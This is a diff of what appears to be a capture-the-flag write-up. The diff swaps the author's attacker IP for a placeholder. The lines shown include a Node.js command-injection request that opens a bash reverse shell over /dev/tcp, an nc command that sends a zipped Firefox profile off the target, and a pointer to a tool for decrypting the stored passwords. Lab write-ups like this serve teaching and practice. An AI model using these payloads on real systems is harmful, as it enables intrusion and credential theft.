@@ -157,7 +157,7 @@ ID           Response   Lines    Word       Chars       Payload
 Now I can exploit the cmd parameter to get a reverse shell (I use Burp Suite to create the connection):
 
 ```
-POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.9.1.194/1337+0>%261"') HTTP/1.1
+POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/MY-IP/1337+0>%261"') HTTP/1.1
 Host: 10.10.162.38
 Accept-Language: en-US,en;q=0.9
 Upgrade-Insecure-Requests: 1
@@ -176,7 +176,7 @@ In the /home/user directory, I find a .firefox directory.
 I then proceed to zip the folder (firefox.tar.gz) and send it to my machine:
 
 ```
-nc 10.9.1.194 33456 < firefox.tar.gz (on target machine)
+nc MY-IP 33456 < firefox.tar.gz (on target machine)
 nc -nvlp 33456 > firefox.tar.gz (on my machine)
 ```
 I find this github https://github.com/unode/firefox_decrypt to decrypt passwords.
